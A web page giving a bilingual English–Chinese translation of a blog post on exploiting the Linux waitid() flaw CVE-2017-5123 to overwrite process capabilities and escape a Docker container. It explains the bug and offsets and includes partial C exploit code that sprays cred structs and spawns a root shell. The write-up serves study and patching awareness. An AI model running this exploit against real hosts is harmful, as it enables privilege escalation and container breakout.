<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>使用 CVE-2017-5123 逃離 Docker 容器</title>
  <meta name="description" content="The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, an...">

  <link rel="canonical" href="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html">
  <link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">

  
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-115432550-1', 'auto');
  ga('send', 'pageview');

</script>
  

  
  <link rel="stylesheet" type="text/css" href="/assets/security-onigiri-110f7e1a7fc9275accf5c1b1ce583cd6090113492a4ee7d2c37a2995334b99c6.css" integrity="sha256-EQ9+Gn/JJ1rM9cGxzlg81gkBE0kqTufSw3oplTNLmcY=" crossorigin="anonymous">
  <script type="text/javascript" src="/assets/security-onigiri-ae2b1fb9cce99fd762ccf2cf2da6c03c479c7b93f8902151aec0b68dfb8bdace.js" integrity="sha256-risfuczpn9dizPLPLabAPEece5P4kCFRrsC2jfuL2s4=" crossorigin="anonymous"></script>
</head>

  <body>
    <header>
  <nav class="navbar is-dark">
		<div class="navbar-brand">
			<a class="navbar-item" href="/">
        <img src="/assets/icon_avatar-63fb8ef941697015c2720bd8d2764b00ecd3d2d75db4a8da9244966f417daf8e.png" integrity="sha256-Y/uO+UFpcBXCcgvY0nZLAOzT0tddtKjakkSWb0F9r44=" crossorigin="anonymous">
			</a>
      <div class="navbar-burger" data-target="navMenu">
        <span></span>
        <span></span>
        <span></span>
      </div>
		</div>
		<div class="navbar-menu" id="navMenu">
			<div class="navbar-start">
        
        
        <a class="navbar-item" href="/about/">
          <span class="icon">
            <i class="fas fa-user"></i>
          </span>
          About
        </a>
        
        
        
        <a class="navbar-item" href="/tags/">
          <span class="icon">
            <i class="fas fa-tags"></i>
          </span>
          Tags
        </a>
        
        
        
        <a class="navbar-item" href="/index.html">
          <span class="icon">
            <i class="fas fa-magic"></i>
          </span>
          Posts
        </a>
        
        
        
        
        
        
        
        
        
        
			</div>
			<div class="navbar-end">
				<a class="navbar-item" href="/feed.xml">
          <span class="icon">
            <i class="fas fa-rss"></i>
          </span>
					Subscribe
				</a>
			</div>
		</div>
	</nav>
</header>

    <main class="section">
    <div class="container">
  <div class="hero-body">
    <div class="container">
      <h1 class="title is-spaced">
        使用 CVE-2017-5123 逃離 Docker 容器
      </h1>
      <h2 class="subtitle">
        <div class="content">
          <span class="icon">
            <i class="fas fa-link"></i>
          </span>
          <a href="https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/">
            https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/
          </a>
        </div>
        <div class="level">
          <div class="level-left">
            <div class="level-item">
              Translated by jhe
            </div>
            <div class="level-item">
              <div class="tags">
                
                
                <a href="/tags/#Docker" class="tag">
                  Docker
                </a>
                
                
                <a href="/tags/#CVE" class="tag">
                  CVE
                </a>
                
                
                <a href="/tags/#Linux" class="tag">
                  Linux
                </a>
                
              </div>
            </div>
          </div>
          <div class="level-right">
            <div class="level-item">
              Mar 31, 2018
            </div>
          </div>
        </div>
      </h2>
    </div>
  </div>
  <article>
    <div class="content">
      <p>The post describes how I exploited the <code class="highlighter-rouge">waitid()</code> vulnerability in order to modify the <a href="https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt">Linux capabilities</a> of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</p>

<blockquote>
  <p>這篇文章描述我如何利用 <code class="highlighter-rouge">waitid()</code> 修改 Docker 容器的 Linux capabilities 從而取得更高的權限，最後逃離了容器監獄。如果你想要看看 Twistlock 如何在他的軌跡中阻止這個弱點，在這篇<a href="https://www.twistlock.com/2018/01/16/blocking-malicious-behavior-exploits-containers-twistlock/">文章</a>有。</p>
</blockquote>

<p>But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of <code class="highlighter-rouge">CAP_SYS_ADMIN</code> and <code class="highlighter-rouge">CAP_NET_ADMIN</code> capabilities. This results in the ability to enable promiscuous mode on <code class="highlighter-rouge">eth0</code>(docker bridge for the container):</p>

<blockquote>
  <p>但在我們深入之前，一張圖勝過千言萬語，這是我的利用過程。它修改容器化行程在記憶體中的 capabilities 結構，導致取得 <code class="highlighter-rouge">CAP_SYS_ADMIN</code> 與 <code class="highlighter-rouge">CAP_NET_ADMIN</code> capabilities。這意味著有能力開啟 <code class="highlighter-rouge">eth0</code>(容器的 docker bridge) 的混沌模式</p>
</blockquote>

<p><a href="https://www.youtube.com/watch?v=IdRDFS4u2rQ">Youtube 影片</a></p>

<p>Note that I have turn off <code class="highlighter-rouge">Kernel ASLR</code> for the recording, but it also works with <code class="highlighter-rouge">KASLR</code> as we can find the kernel base and the heap base by using the same vulnerability.</p>

<blockquote>
  <p>請留意我在影片中已經關掉 <code class="highlighter-rouge">Kernel ASLR</code>，但在 <code class="highlighter-rouge">KASLR</code> 的狀態下依然可以藉由同一個弱點成功找到核心基址與堆積基址。</p>
</blockquote>

<p>CVE-2017-5123 was published earlier this year on Oct 12 - it was a Linux kernel vulnerability in the <code class="highlighter-rouge">waitid()</code> syscall for 4.12-4.13 kernel versions. The <code class="highlighter-rouge">waitid()</code> syscall defined as:</p>

<blockquote>
  <p><a href="https://access.redhat.com/security/cve/cve-2017-5123">CVE-2017-5123</a> 是今年 8 月 12 日發布 - 它是一個在 <code class="highlighter-rouge">waitid()</code> 系統呼叫的 Linux 核心 4.12-4.13 版本弱點。<code class="highlighter-rouge">waitid()</code> 系統呼叫定義為：</p>
</blockquote>

<pre><code class="language-clike">int waitid(idtype_t idtype, it_t id, siginfo_t *infop, int options);
</code></pre>

<p>The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the<code class="highlighter-rouge">infop</code>pointer above. The pointer points to a struct siginfo described below. In this struct we can control sveral variables, specifically pid and status.</p>

<blockquote>
  <p>該弱點允許一個攻擊者寫入部份可控資料到攻擊者選擇的核心記憶體位址中。核心記憶體位址可以由<code class="highlighter-rouge">infop</code>指標提供。這個指標指向一個結構<code class="highlighter-rouge">siginfo</code>如下所述。在這個結構我們可以控制數個變數，特別是<code class="highlighter-rouge">pid</code>與<code class="highlighter-rouge">status</code>。</p>
</blockquote>

<p>As you can see below, the control is rather indirect.</p>

<blockquote>
  <p>下面如你所見，這個控制相當不直接。</p>
</blockquote>

<pre><code class="language-clike">struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding; // this remains unchaged by waitid
    int pid;     // process id
    int uid;     // user id
    int status;  // return code
}
</code></pre>

<p>Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the <code class="highlighter-rouge">pid</code> value by creating a lot of processes with the help of <code class="highlighter-rouge">fork()</code> or <code class="highlighter-rouge">clone()</code> until we hit the desired <code class="highlighter-rouge">pid</code> value. Still, we are limited by the <code class="highlighter-rouge">PID_MAX</code> value of the system, which is by default configured to be 32768 which equals to 0x8000 in hex.</p>

<blockquote>
  <p>多數的數值無法被我們控制，或是對我們來說在大小方面有所限制，然而我們可以藉由<code class="highlighter-rouge">fork()</code>或<code class="highlighter-rouge">clone()</code>的幫助創造很多行程，來控制 <code class="highlighter-rouge">pid</code>的值，直到我們觸碰到想要的<code class="highlighter-rouge">pid</code>為止。但我們仍受限於系統中<code class="highlighter-rouge">PID_MAX</code>的值，預設為 <em>32768</em> 等於 十六進位 <em>0x8000</em>。</p>
</blockquote>

<p>Note: In a non-containerized environment we could elevate this number after changing our <code class="highlighter-rouge">uid</code> to 0 and gain root privileges, as we could modify <code class="highlighter-rouge">/proc/sys/kernel/pid_mx</code> to any number.</p>

<blockquote>
  <p>註：在一個非容器的環境，我們可以在將 <code class="highlighter-rouge">uid</code> 設為0後提高這個數字，並取得 root 權限，如同我們可以修改 <code class="highlighter-rouge">/proc/sys/kernel/pid_max</code> 為任何數字。</p>
</blockquote>

<h2 id="linux-capabilities">Linux Capabilities</h2>

<p>In this section I’ll focus on a short overview of Linux capabilities - what they are, how Docker uses them, and how they are represented in the memory.</p>

<blockquote>
  <p>在這個章節我將專注在簡短概觀的 Linux capabilities - 它們是什麼，與Docker 如何使用它們，與它們在記憶體中如何被表示。</p>
</blockquote>

<p>The code snippet below is taken from <em>linux/cred.h</em> and is the definition of the credentails struct that each process has:</p>

<blockquote>
  <p>下方是從 <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h">linux/cred.h</a> 擷取的程式碼片段 ，為每個行程的認證資訊結構：</p>
</blockquote>

<pre><code class="language-clike">struct cred {
    atomic_t usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t subscribers; /* number of processes subscribed */
    void *put_addr;
    unsigned magic;
#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t uid; /* real UID of the task */
    kgid_t gid; /* real GID of the task */
    kuid_t suid; /* saved UID of the task */
    kgid_t sgid; /* saved GID of the task */
    kgid_t euid; /* effective UID of the task */
    kuid_t egid; /* effective GID of the task */
    kuid_t fsuid; /* UID for VFS ops */
    kgid_t fsgid /* GID for VFS ops */
    Unsigned securebits; /* SUID-less security management */
    Kernel_cap_t cap_inheritable; /* caps our children can inherit */
    Kernel_cap_t cap_permitted; /* caps we're permitted */
    Kernel_cap_t cap_effective; /* caps we can actually use */
    Kernel_cap_t cap_ambient; /* Ambient capability set */
}
</code></pre>
<p><strong>man capabilities:</strong></p>

<p>Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuse into distinc units, known as <em>capabilities</em>, which can be independently enabled and disabled. Capabilities are a per-thread attribute.</p>

<blockquote>
  <p>從核心 2.2開始，Linux 將傳統與超級使用者相關聯的權限分成不同的單元，可被個別啟用及停用，並稱之為 <em>capabilities</em>。每個執行緒都會有各自的 Capabilities 屬性。</p>
</blockquote>

<p>Linux capabilities are stored inside each process’s own <code class="highlighter-rouge">cred struct</code> and represented by a bitmask. For example all caps enabled would be represented by a bitmask of <code class="highlighter-rouge">0xFFFFFFFFFFFFFFFF
</code>.</p>

<blockquote>
  <p>Linux capabilities 被儲存在每個行程自己的 <code class="highlighter-rouge">cred struct</code> 並使用 bitmask 來表示。例如所有的 caps 都被啟用的話，則用 bitmask 表示成 <code class="highlighter-rouge">0xFFFFFFFFFFFFFFFF
</code>。</p>
</blockquote>

<p>Each capability provides a different set of permissions, for instance:</p>

<blockquote>
  <p>每個 capability 提供一個不同的權限分配，舉例來說:</p>
</blockquote>

<p><strong>CAP_SYS_MODULE</strong> - allows for loading &amp; unloading kernel modules.</p>

<p><strong>CAP_NET_ADMIN</strong> - allows for various network operations. For example entering promiscuous mode, interface configuration and more.</p>

<p><strong>CAP_SYS_ADMIN</strong> - enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more(this cap gives the most privileges and overloads others).</p>

<blockquote>
  <p><strong>CAP_SYS_MODULE</strong> - 允許載入或卸載核心模組。</p>

  <p><strong>CAP_NET_ADMIN</strong> - 允許數種網路操作，例如開啟混沌模式，介面設定等等。</p>

  <p><strong>CAP_SYS_ADMIN</strong> - 啟用一個範圍內的系統管理操作，如 quotactl, mount, umount, swapon, setdomainname, ptrace 等等(這個 cap 給了最多權限並會多載其他的 cap)。
(編按:這個權限在 Linux manual 中建議最好避免使用，畢竟會賦予非常多的權限，幾乎可以說是一個另類的 root，除非須需求幾乎等同於此 cap，否則建議能避則避。)</p>
</blockquote>

<p>You can find the full list of CAPS over here.</p>

<blockquote>
  <p>你可以在<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">這裡</a>找到完整的 CAPS 清單。</p>
</blockquote>

<p>Docker uses capabilites to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kenrel modules.</p>

<blockquote>
  <p>Docker 使用 capabilities 來為容器提供一個較好的隔離環境。Docker 純粹的將可能造成脫離容器的 capabilities 拿掉。例如，你會幾乎看不到一個容器運行在限制之外，有著上述三個 capabilities 的任何一個，當一個容器可以存取網路介面並嗅探其他容器或是主機的流量，或是一個在容器中的使用者可以在主機上掛上目錄並且載入核心模組，這些都是有安全疑慮的。</p>
</blockquote>

<p>Although it might be easier to build a ROP chain and call commit_creds(0) in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of struct creds like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing(we are limited to 0x8000) and the value of <code class="highlighter-rouge">0xFFFFFFFFFFFFFFFF</code> is out of reach for us.</p>

<blockquote>
  <p>雖然造一個 <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>鏈來呼叫 commit_creds(0) 以獲得 root 權限與全部的 capabilities 似乎來的更簡單一點，但為了學到更多與堆積噴灑相關的技巧，並且在不知道目標環境下的漏洞利用方法，就像 Federico 做的一樣，將數千個 creds 結構噴好噴滿到核心堆積中。這個漏洞利用的缺點就是無法取得全部的 caps，因為我們無法控制寫入的東西(我們受限於 0x8000 的限制) 而且 <code class="highlighter-rouge">0xFFFFFFFFFFFFFFFF</code> 對我們來說是不可能達到的。</p>
</blockquote>

<h2 id="the-vulnerability--弱點成因">The vulnerability / 弱點成因</h2>

<p>The code snippet below is taken from <em>kernel/exit.c</em> and is in charnge of handling the <code class="highlighter-rouge">waitid()</code> syscall:</p>

<blockquote>
  <p>這是從 <em>kernel/exit.c</em> 取得的程式碼片段，負責處理系統
呼叫 <code class="highlighter-rouge">waitid()</code>:</p>
</blockquote>

<pre><code class="language-clike">SYSCALL_DEFINE5(waitid, int, which , pid_t, upid, struct siginfo __user *, infop, int, options, struct rusage __user *, ru)
{
    struct rusage r;
    struct waitid_info info = {.status = 0};
    
    long err = kernel_waitid(which, upid, &amp;info, options, ru ? &amp;r : NULL);
    
    int signo = 0;
    
    if (err &gt; 0) {
        signo = SIGCHLD;
        err = 0;
        if (ru &amp;&amp; copy_to_user(ru, &amp;r, sizeof(sturct rusage)))
        return -EFAULT;
    }
    if (!infop)
        return err;
    
    if (!/*醒目*/access_ok/*提示*/(VERIFY_WRITE, infop, sizeof(*infop)))
        return -EFAULT; 
    user_access_begin();
    unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);
    unsafe_put_user(0, &amp;infop-&gt;si_errno, Efault);
    unsafe_put_user(info.cause, &amp;infop-&gt;si_code, Efault);
    unsafe_put_user(info.pid, &amp;infop-&gt;si_pid, Efault);
    unsafe_put_user(info.uid, &amp;infop-&gt;si_uid, Efault);
    unsafe_put_user(info.status, &amp;infop-si_status, Efault);
    user_access_end();
    return err;
Efault:
    user_access_end();
    return -EFAULT;
}
</code></pre>

<p>The vulnerability is that the highlighted <code class="highlighter-rouge">access_ok()</code> check, which ensures that the user specified pointer is in face a user-space pointer, was missing in the <code class="highlighter-rouge">waitid()</code> syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing <code class="highlighter-rouge">unsafe_put_user</code>.</p>

<blockquote>
  <p>弱點在於有醒目提示的 <code class="highlighter-rouge">access_ok()</code> 檢查，用來保證使用者指定的指標是屬於使用者空間的指標，在 <code class="highlighter-rouge">waitid()</code> 系統呼叫中少了這個檢查，缺了這個檢查，使用者可以提供一個核心地址指標，當執行 <code class="highlighter-rouge">unsafe_put_user</code> 時系統呼叫會毫無異議的寫入該位址。</p>
</blockquote>

<p>As we already know - we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.</p>

<blockquote>
  <p>如同我們已經知道的 - 我們不能任意的想寫入哪裡就寫入哪裡，但我們必須在這些限制之下，竭盡我們所能的嘗試獲取可寫位址。</p>
</blockquote>

<p><code class="highlighter-rouge">Info.status</code> is a 32bit int, but the value of status is constrained to 0 &lt; status &lt; 256 as we can ses in the exit codes documentation, and as we already know<code class="highlighter-rouge">pid</code>is constrained by<code class="highlighter-rouge">MAX_PID</code></p>

<blockquote>
  <p><code class="highlighter-rouge">Info.status</code>是一個 32bit 整數，但狀態的值被約束在 0 與 256 之間，就像我們在 exit 程式碼文件看到的，同時我們也知道<code class="highlighter-rouge">pid</code>被<code class="highlighter-rouge">MAX_PID</code>約束了。</p>
</blockquote>

<p>At this point we have the ability to write a value of pid: 0 &lt; pid &lt; 0x8000 to anywhere we want. The next challenge is to detect where we should write in order to successfully overwirte the desired values.</p>

<blockquote>
  <p>目前我們有寫入 pid 值得能力: 介於 0 到 0x8000，到任意我們想要的地方，下一個挑戰是偵測到我們該寫到的位置，才能成功的覆寫想要的值。</p>
</blockquote>

<p>We need to rememer that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of <code class="highlighter-rouge">unsafe_put_user()</code></p>

<blockquote>
  <p>我們需要記得，系統呼叫在每次執行的時候，實際上會寫入 6 個不同欄位，因為有 6 個 <code class="highlighter-rouge">unsafe_put_user()</code> 被執行了。</p>
</blockquote>

<p>So we will need to take into account the offset of <code class="highlighter-rouge">pid</code> inside the <code class="highlighter-rouge">infop</code> sturct and use it to subtract that value from the target address into <code class="highlighter-rouge">waitid()</code> syscall as the <code class="highlighter-rouge">infop</code> pointer.</p>

<blockquote>
  <p>所以我們需要帶入 <code class="highlighter-rouge">infop</code> 結構中 <code class="highlighter-rouge">pid</code> 的帳戶偏移值，並使用它減去到 <code class="highlighter-rouge">waitid()</code> 呼叫的目標位址的值作為 <code class="highlighter-rouge">infop</code> 指標。</p>
</blockquote>

<p>Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.</p>

<blockquote>
  <p>我們使用這個漏洞利用的主要目標是，覆寫 Docker 為我們設定的 capabilities，就可以獲得額外的權限並且逃離容器。</p>
</blockquote>

<h2 id="spray-n-pray--噴灑並禱告">Spray n’ Pray / 噴灑並禱告</h2>

<p>I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of struct <code class="highlighter-rouge">creds</code> and then start guessing by writing to various addresses and pray to hit my target.</p>

<blockquote>
  <p>我決定使用與 Federico 相似的方法，所以我用數千個 <code class="highlighter-rouge">creds</code> 結構將核心堆積噴好噴滿，然後開始透過寫入不同位址來猜測，禱告並祈求可以擊中我的目標。</p>
</blockquote>

<p>By picking a value that we can track such as <code class="highlighter-rouge">uid</code> (which we can track with getuid()).</p>

<blockquote>
  <p>藉著選一個我們可以追蹤的值如 <code class="highlighter-rouge">uid</code> (我們可以使用 getuid() 來追蹤)。</p>
</blockquote>

<p>We can, with a little bit a luck, pinpoint our <code class="highlighter-rouge">struct cred</code> location, after which we will be able to write to specific offsets in order to overwrite the <code class="highlighter-rouge">capabilities</code>,<code class="highlighter-rouge">gid</code>,<code class="highlighter-rouge">euid</code> and anything else we want.</p>

<blockquote>
  <p>幸運的話，我們可以做到的，指向我們的 <code class="highlighter-rouge">struct cred</code> 位置，之後我們將能寫到指定的偏移，就可以覆寫 <code class="highlighter-rouge">capabilities</code>, <code class="highlighter-rouge">gid</code>, <code class="highlighter-rouge">euid</code> 與其他任何我們想要的東西。</p>
</blockquote>

<p>But in order to do that we need to figure out the actual offsets, which we will do with the help of <code class="highlighter-rouge">gdb</code>:</p>

<blockquote>
  <p>但為了要實現，我們需要搞清楚真實的偏移值，我們將依靠 <code class="highlighter-rouge">gdb</code> 的幫助來實現:</p>
</blockquote>

<p><img src="https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png" alt="" /></p>

<p>As we can see, <code class="highlighter-rouge">kuid_t</code> is 4 bytes in size, as such if we found uid on <code class="highlighter-rouge">0xFFFF880023cc1004</code> than <code class="highlighter-rouge">gid</code> will be at <code class="highlighter-rouge">0xFFFF880023cc1008</code>, 4 bytes above, and <code class="highlighter-rouge">euid</code> will be at <code class="highlighter-rouge">0xFFFF880023CC1014</code> which is 4*0x4=0x10 bytes above our <code class="highlighter-rouge">uid</code> address as illustrated in the diagram below.</p>

<blockquote>
  <p>猶如我們看到的， <code class="highlighter-rouge">kuid_t</code> 是 4 個位元組的大小，因為醬子，如果我們在 <code class="highlighter-rouge">0xFFFF880023cc1004</code> 發現 uid ，那麼 <code class="highlighter-rouge">gid</code> 會在 <code class="highlighter-rouge">0xFFFF880023cc1008</code>， 4 個位元組之上，而 <code class="highlighter-rouge">euid</code> 會在 <code class="highlighter-rouge">0xFFFF880023CC1014</code>，就是 4*0x4=0x10(編按: 0x開頭是16進位，並非0乘4) 位元組之上，我們的 <code class="highlighter-rouge">uid</code> 位址，如下圖所示。</p>
</blockquote>

<p><img src="https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png" alt="" /></p>

<p>So essentially in order to overwite our caps will have to write to:</p>

<blockquote>
  <p>所以重要的是為了覆寫我們的 caps 將必須寫到:</p>
</blockquote>

<p><code class="highlighter-rouge">address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inferitable</code></p>

<p>Note: These addresses are relevant to my system, your addresses might differ.</p>

<blockquote>
  <p>註: 這些位址跟我的系統有相關聯，你的位址可能會不一樣。</p>
</blockquote>

<p>In order to find out where our sprayed <code class="highlighter-rouge">cred structs</code> might land in the heap we will use <code class="highlighter-rouge">gdb</code> again and set a breakpoint on <code class="highlighter-rouge">sys_getuid</code> in order to break when our program calls <code class="highlighter-rouge">getuid()</code>.</p>

<blockquote>
  <p>為了找到我們噴灑的 <code class="highlighter-rouge">cred structs</code> 在堆積中可能的落點，我們將再次使用 <code class="highlighter-rouge">gdb</code> 並設置一個中斷點在 <code class="highlighter-rouge">sys_getuid</code> 上，以便在程式呼叫 <code class="highlighter-rouge">getuid()</code> 的時候中斷下來。</p>
</blockquote>

<p>A few step commands after the breakpoint (it took 5 on my system) should reveal the <code class="highlighter-rouge">cred struct</code> address in the RAX register.</p>

<blockquote>
  <p>斷下來後，步進幾個指令(在我的系統上是 5 個)應該會在 RAX 暫存器中顯示 <code class="highlighter-rouge">cred struct</code> 的位址。</p>
</blockquote>

<p>We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the <code class="highlighter-rouge">struct cred</code> is most likely to be in the heap</p>

<blockquote>
  <p>我們可以重複這個找結構的過程，藉由數個分叉(fork)以便收集足夠的位址並分析統計 <code class="highlighter-rouge">struct cred</code> 在堆積中最有可能的所在。</p>
</blockquote>

<p>So the plan is as follows:</p>

<blockquote>
  <p>計畫如下:</p>
</blockquote>

<ol>
  <li>Spawn thousands of processes by calling <code class="highlighter-rouge">fork()</code> in order to create thousands of <code class="highlighter-rouge">cred structs</code> in the kernel heap and make each of the processes constantly check if its UID==0 by calling <code class="highlighter-rouge">getuid()</code></li>
  <li>Start writing the value 0 to addresses to which the <code class="highlighter-rouge">struct cred-&gt;uid</code> might land</li>
  <li>If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the <code class="highlighter-rouge">uid</code> value with our guesses from step 2. Now we can overwrite the rest of the <code class="highlighter-rouge">cred struct</code> and change caps by writing to the offsets that we determined.</li>
</ol>

<blockquote>
  <ol>
    <li>為了在核心堆積中創造數千個 <code class="highlighter-rouge">cred structs</code> 需要透過呼叫 <code class="highlighter-rouge">fork()</code> 產生數千個行程，並且呼叫 <code class="highlighter-rouge">getuid()</code> 使每個行程都不斷地檢查它自己的 UID 是否為 0</li>
    <li>開始將 0 寫入位 <code class="highlighter-rouge">struct cred-&gt;uid</code> 可能的落點位址中</li>
    <li>當其中一個我們分叉(fork)出來的行程獲得 uid 為 0，就代表我們已經成功從第二步猜測到並覆寫了<code class="highlighter-rouge">uid</code>的值。現在我們可以覆寫 <code class="highlighter-rouge">cred struct</code> 其餘的部分並藉由覆寫我們計算的值來修改 caps。</li>
  </ol>
</blockquote>

<p>Our dirty exploit will be something to the effect of:</p>

<blockquote>
  <p>我們的髒髒漏洞利用效果如下:</p>
</blockquote>

<pre><code class="language-clike">void writecaps(char *addr,unsigned long value){
while(1) {
      int pid = clone(exit_func, &amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if (pid == value) {
        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
        break;
      }
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {"/bin/sh", NULL};
for (int i=0;i&lt;5000;i++)
{
    pid = fork();
    if (pid==0)
    { // child process
  while (1) {
    
    if (*glob_var==1) {
      syscall(SYS_exit, 0);
    }
    if (getuid() == 0){
        //FOUND!!
    printf("[+] Got UID: 0 !\n");
     *glob_var = 1;
     writecaps((char *)finalcapsaddress,value);
    printf("Done, spawning a shell \n");
    execve("/bin/sh", argv, NULL);
    }
}
    }

    else if(pid&lt;0)
    {
        printf("failed to fork");
    }

    else // parent process
    {

    }
}
}

void swapuid(){

    char* i,p;
    while(*glob_var!=1)
    {
    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
        {
        if(*glob_var==1)
            {
            break;
            }
        printf("trying %p\n",i);
        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
        sleep(1);
        }
    }
munmap(glob_var, sizeof *glob_var);
printf("Found uid on %p\n",i-0xc0);
sleep(10000);
}

int main(void)
{
    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *glob_var = 0;

unsigned long* base = findbase();
    findheapbase();
    spraynpray();
    swapuid();
}
    
</code></pre>

<p>After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.</p>

<blockquote>
  <p>在分析我的系統資後 (Ubuntu 17.10, 核心 4.13.0-15, 架構 x86-64)，我發現數個區域貌似是運行時 creds 結構有 70% 以上的落點，但那仍然有使機器掛掉的風險存在，因為我們可能會覆寫到核心中重要的東西。</p>
</blockquote>

<h2 id="conclusion--結論">Conclusion / 結論</h2>

<p>In 2017 alone, 434 linux kernel exploits where found, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.</p>

<blockquote>
  <p>光是 2017 年就已經有 <a href="https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33">434 個 Linux 核心漏洞利用</a>被發現，如同你在這篇文章中看到的一樣，核心漏洞利用對容器環境來說是具毀滅性的。這是因為容器與主機分享核心，因此光是信任內建的保護機制並不足夠。確保你的核心在所有的產品主機都總是最新的。</p>
</blockquote>

<p>Thank you for reading and don’t forget to follow us @TwistlockLabs.</p>

<blockquote>
  <p>謝謝你的閱讀，別忘了在 <a href="https://twitter.com/TwistlockLabs">@TwistlockLabs</a> 跟隨我們。</p>
</blockquote>

<p>Big credits to Federico Bento for pointing some things out and to <a href="https://salls.github.io/Linux-Kernel-CVE-2017-5123/">Chris Salls</a> for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.</p>

<blockquote>
  <p>給點清了某些事情的<a href="https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/">Federico Bento</a>一個大大的讚， <a href="https://salls.github.io/Linux-Kernel-CVE-2017-5123/">Chris Salls</a>也是，感謝他的 Chrome 沙盒逃脫漏洞利用; 我的漏洞利用大多數是基於他們的成果。</p>
</blockquote>

    </div>
  </article>
  

  <div id="disqus_thread" class="ui comment"></div>
  <script>
    var disqus_config = function () {
      this.page.url = 'https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html';
      this.page.identifier = 'https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html';
    };

    (function() {
      var d = document, s = d.createElement('script');

      s.src = 'https://bananaappletw.disqus.com/embed.js';

      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>


</div>

    </main>
    <footer class="footer">
  <div class="container has-text-centered">
    <div class="content">
      Theme by
      <a class="item" href="https://github.com/security-onigiri/security-onigiri">
        <span class="icon">
          <i class="fab fa-github"></i>
        </span>
        security-onigiri
      </a>
    </div>
  </div>
</footer>

  </body>
</html>
